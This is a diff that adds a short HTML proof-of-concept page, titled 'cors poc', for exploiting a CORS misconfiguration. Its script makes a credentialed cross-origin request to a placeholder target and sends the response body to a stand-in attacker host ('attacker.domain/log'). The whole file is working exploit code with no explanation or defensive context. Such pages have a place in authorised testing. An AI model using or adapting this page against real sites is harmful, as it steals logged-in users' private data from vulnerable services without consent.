@@ -1,0 +1,20 @@
+<html>
+<head>
+  <title>cors poc</title>
+  <meta charset="utf-8">
+</head>
+<script type="text/javascript">
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open("get","http://xxx.com/xxx/xxx",true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener(){
+  location="//attacker.domain/log?response="+this.responseText;
+  };
+  </script>
+  <body>
+   cors poc
+  </body>
+  </html>
+  
